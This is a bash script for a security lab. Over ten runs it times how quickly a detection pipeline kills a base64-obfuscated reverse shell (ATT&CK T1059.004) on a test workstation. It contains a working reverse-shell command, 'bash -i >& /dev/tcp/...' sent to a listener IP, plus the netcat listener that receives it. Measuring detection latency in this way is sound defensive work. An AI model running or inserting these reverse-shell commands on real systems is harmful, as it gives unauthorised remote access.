#!/bin/bash
# Base64 exec response time (T1059.004): launch a base64-obfuscated reverse shell,
# time until the pipeline kills it. Run from a machine that can SSH to the lab.
set -uo pipefail

source "$(dirname "${BASH_SOURCE[0]}")/../experiments.env"
RUNS=10
COOLDOWN=20
TIMEOUT_LIMIT=30

RESULTS_FILE="$(pwd)/base64_exec_results.txt"
CTRL="$SSH_CONTROLLER"
EP="$SSH_WORKSTATION"

echo "Endpoint : $EP"
echo "Listener : $LISTENER_IP:$LISTENER_PORT (on controller)"
echo "Payload  : echo '$PAYLOAD' | base64 -d | bash"
echo ""

> "$RESULTS_FILE"

for i in $(seq 1 "$RUNS"); do
    echo "===== Run $i / $RUNS ====="

    $CTRL "pkill -f 'nc -lvp $LISTENER_PORT'" 2>/dev/null || true
    $EP "sudo pkill -f 'bash -i'" 2>/dev/null || true
    sleep 2

    $CTRL "timeout 30 nc -lvp $LISTENER_PORT > /dev/null 2>&1 &" 2>/dev/null
    sleep 1

    #    Step a: base64 decode triggers auditd → rule 100300
    #    Step b: reverse shell launched with nohup (proven pattern)
    #    Both in one bash -c so auditd sees "bash" + "base64" together
    t_start=$(python3 -c "import time; print(time.time())")
    $EP "sudo bash -c 'echo $PAYLOAD | base64 -d > /dev/null; nohup bash -i >& /dev/tcp/$LISTENER_IP/$LISTENER_PORT 0>&1 &'" 2>/dev/null
    sleep 1

    REMOTE_PID=$($EP "sudo ss -tnp state established | grep ':$LISTENER_PORT' | grep -oP 'pid=\K\d+' | head -1" 2>/dev/null)

    if [ -z "$REMOTE_PID" ]; then
        echo "  ERROR: could not find reverse shell PID via ss"
        $CTRL "pkill -f 'nc -lvp $LISTENER_PORT'" 2>/dev/null || true
        sleep "$COOLDOWN"
        continue
    fi

    echo "  PID: $REMOTE_PID"

    t_end=""
    end_by=$(($(date +%s) + TIMEOUT_LIMIT))
    while [ "$(date +%s)" -lt "$end_by" ]; do
        if ! $EP "sudo kill -0 $REMOTE_PID" 2>/dev/null; then
            t_end=$(python3 -c "import time; print(time.time())")
            break
        fi
        sleep 0.5
    done

    $CTRL "pkill -f 'nc -lvp $LISTENER_PORT'" 2>/dev/null || true

    if [ -z "$t_end" ]; then
        echo "  TIMEOUT - process not killed within ${TIMEOUT_LIMIT}s"
        $EP "sudo kill -9 $REMOTE_PID" 2>/dev/null || true
        sleep "$COOLDOWN"
        continue
    fi

    delta=$(python3 -c "print(round($t_end - $t_start, 3))")
    echo "  $delta s"
    echo "$delta" >> "$RESULTS_FILE"

    sleep "$COOLDOWN"
done

echo ""
echo "===== Summary ====="
python3 "$(dirname "${BASH_SOURCE[0]}")/latency_stats.py" "$RESULTS_FILE"
